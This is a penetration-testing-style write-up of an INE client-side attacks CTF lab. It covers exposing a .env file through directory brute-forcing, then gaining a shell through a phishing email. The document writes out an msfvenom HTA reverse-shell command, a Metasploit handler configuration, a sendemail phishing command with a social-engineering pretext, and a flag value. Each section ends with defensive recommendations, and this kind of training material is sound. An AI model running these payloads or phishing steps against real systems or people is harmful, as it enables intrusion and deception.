INE Client-Side Attacks CTF 1 – Penetration Testing Report

Objective:
This Capture the Flag (CTF) lab simulates a realistic client-side attack scenario where the goal is to first gather intelligence via a public-facing web application, then deliver a malicious payload via email to gain remote access to an internal system. Two flags were retrieved during the exercise, showcasing a full exploitation chain.
🧭 Environment

    Attack Platform: Kali Linux (INE-provided GUI environment)

    Target Domains:

        Public Website: http://fintech.com

        Internal Mail Server: mail.server.local

        Target Machine (Post-Exploitation): Windows Server

🧩 Flag 1 – Reconnaissance & Data Exposure
🎯 Objective

Identify exposed information on the target's public-facing website and retrieve the first flag.
🛠 Tools Used

    dirb – Directory brute-forcing

    curl – Manual file inspection

🔍 Methodology
🔎 Directory Brute-Forcing

Ran a scan using a common wordlist:

dirb http://fintech.com /usr/share/dirb/wordlists/common.txt

Discovered Paths:

    /index.html – Default landing page

    /server-status – 403 Forbidden

    /static/ – Listable directory

    /.env – Exposed configuration file (HTTP 200 OK)

📂 Sensitive File Extraction

Used curl to retrieve the .env file:

curl http://fintech.com/.env

Contents included:

    Internal credentials

    Email server config

    API keys

    Internal email: techsupport@staff.fincorp.com

    FLAG1=eee8670f30514511bc4e495e167aefec

🏁 Flag 1

eee8670f30514511bc4e495e167aefec

📌 Finding

A .env file containing highly sensitive information was publicly accessible due to misconfiguration, revealing credentials and internal infrastructure details.
🛡️ Recommendation

    Never expose .env or similar config files in web-accessible directories.

    Implement server-side rules to deny access to hidden/system files.

    Regularly audit public-facing resources for misconfigurations.

🎯 Flag 2 – Client-Side Exploitation via Phishing
🎯 Objective

Craft and deliver a phishing payload via internal email to gain remote access and retrieve Flag 2 from the victim machine.
🛠 Tools Used

    msfvenom – Payload generation

    Metasploit Framework – Listener and exploitation

    sendemail – Email delivery tool

    Meterpreter – Post-exploitation shell

🧪 Steps to Exploitation
🕵️ Recon from Task 1

From .env:

    Target email: techsupport@staff.fincorp.com

    Mail server: mail.server.local:25

💉 Payload Generation

Created an HTA-based reverse shell:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.36.2 LPORT=4444 -f hta-psh > invoice.hta

⚙️ Listener Setup

Started Metasploit listener:

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.36.2
set LPORT 4444
set ExitOnSession false
exploit -j

✉️ Phishing Delivery

Sent the HTA payload via SMTP:

sendemail -f it-support@fintech.com -t techsupport@staff.fincorp.com \
-s mail.server.local:25 \
-u "Urgent Security Patch" \
-m "Please execute the attached diagnostic tool to apply critical updates." \
-a invoice.hta

🖥️ Exploitation and Privilege Escalation

    Payload executed successfully.

    Meterpreter session established.

    Verified user: EC2AMAZ-JED9FRA\Administrator

    Used getsystem to escalate to NT AUTHORITY\SYSTEM

🏁 Flag Retrieval

Flag located on the Administrator’s desktop:

cd C:\Users\Administrator\Desktop
cat flag2.txt

🏁 Flag 2

Retrieved successfully from target system (content intentionally excluded).

📌 Finding

The internal user executed the malicious HTA file, demonstrating successful exploitation of human behavior (social engineering) combined with technical vulnerability (script execution permissions).
🛡️ Recommendation

    Implement robust email attachment filtering and endpoint protection.

    Educate staff on phishing awareness and safe computing practices.

    Disable HTA execution on endpoints unless explicitly required.

    Monitor outbound traffic for anomalous connections.

🧠 Conclusion

This lab illustrates the real-world impact of combining misconfigurations, exposed credentials, and social engineering. It highlights the importance of securing both the perimeter (public web apps) and internal assets (email security, user awareness).
✅ Summary of Flags
Flag	Description	Value
1	Exposed via misconfigured .env	eee8670f30514511bc4e495e167aefec
2	Retrieved post-exploitation	(Obtained via Meterpreter access)
